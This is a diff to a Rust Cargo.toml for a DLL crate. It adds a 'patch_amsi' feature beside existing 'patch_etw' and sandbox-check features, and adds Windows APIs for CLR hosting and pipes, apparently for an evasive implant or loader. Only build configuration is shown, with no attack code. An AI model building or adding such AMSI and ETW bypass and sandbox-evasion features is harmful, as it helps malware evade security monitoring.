@@ -6,7 +6,6 @@ build = "build.rs"
 
 [profile.release]
 opt-level = "z"
-codegen-units = 1
 lto = "fat"
 strip = "symbols"
 panic = "abort"
@@ -30,6 +29,7 @@ crate-type = ["cdylib"]
 sandbox_trig = []
 sandbox_mem = []
 patch_etw = []
+patch_amsi = []
 
 [dependencies]
 minreq = { version="2.13", features = [
@@ -56,6 +56,13 @@ windows-sys = {version = "0.61", features = [
     "Win32_System_Diagnostics_Debug",
     "Win32_System_Services",
     "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_Ole",
+    "Win32_System_Variant",
+    "Win32_System_ClrHosting",
+    "Win32_System_Com",
+    "Win32_System_Console",
+    "Win32_System_IO",
+    "Win32_System_Pipes",
 ]}
 rand = "0.9"
 windows-registry = "0.6"
